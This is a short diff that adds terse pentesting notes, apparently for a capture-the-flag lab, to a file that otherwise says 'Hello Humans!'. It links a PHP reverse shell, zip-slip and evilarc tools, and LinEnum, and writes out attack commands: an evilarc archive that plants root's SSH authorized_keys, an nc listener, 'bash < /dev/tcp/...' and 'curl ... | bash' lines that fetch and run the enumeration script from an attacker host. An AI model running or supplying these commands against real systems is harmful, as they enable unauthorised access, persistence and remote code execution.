@@ -1,1 +1,21 @@
 Hello Humans!
+
+https://github.com/pentestmonkey/php-reverse-shell
+
+https://github.com/snyk/zip-slip-vulnerability
+
+https://github.com/ptoomey3/evilarc
+python evilarc.py -i unix -d 2 -p root/.ssh authorized_keys
+
+https://github.com/rebootuser/LinEnum
+nc -lvnp 9001 < LinEnum.sh
+-l           listen mode, for inbound connects
+-v           verbose [use twice to be more verbose]
+-n           numeric-only IP addresses, no DNS
+-p port      local port number (port numbers can be individual or ranges: lo-hi [inclusive])
+
+bash < /dev/tcp/10.10.14.3/9001
+
+python -m SimpleHTTPServer
+curl 10.10.14.3:800/LinEnum.sh | bash
+
